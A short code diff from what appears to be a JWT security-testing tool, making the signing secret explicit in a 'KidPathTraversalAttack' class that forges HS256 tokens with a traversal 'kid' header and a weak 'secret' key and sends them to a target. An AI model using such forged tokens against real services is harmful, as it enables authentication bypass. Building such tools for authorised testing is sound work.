@@ -32,7 +32,7 @@ def decode_jwt_part(part: str) -> dict | Any | None:
         return None
 
 
-def create_jwt(header: dict, payload: dict, secret: bytes = b"secret") -> str:
+def create_jwt(header: dict, payload: dict, secret: bytes) -> str:
     """Create a JWT token with HMAC-SHA256 signature."""
     header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
     payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
@@ -253,7 +253,8 @@ class KidPathTraversalAttack:
                 kid_header = dict(header)
                 kid_header["kid"] = kid_path
                 kid_header["alg"] = "HS256"
-                kid_token = create_jwt(kid_header, payload)
+                # Use a known weak secret for traversal testing (Fix Audit #6)
+                kid_token = create_jwt(kid_header, payload, secret=b"secret")
 
                 for auth_header in JWT_AUTH_HEADERS:
                     resp = session.request(
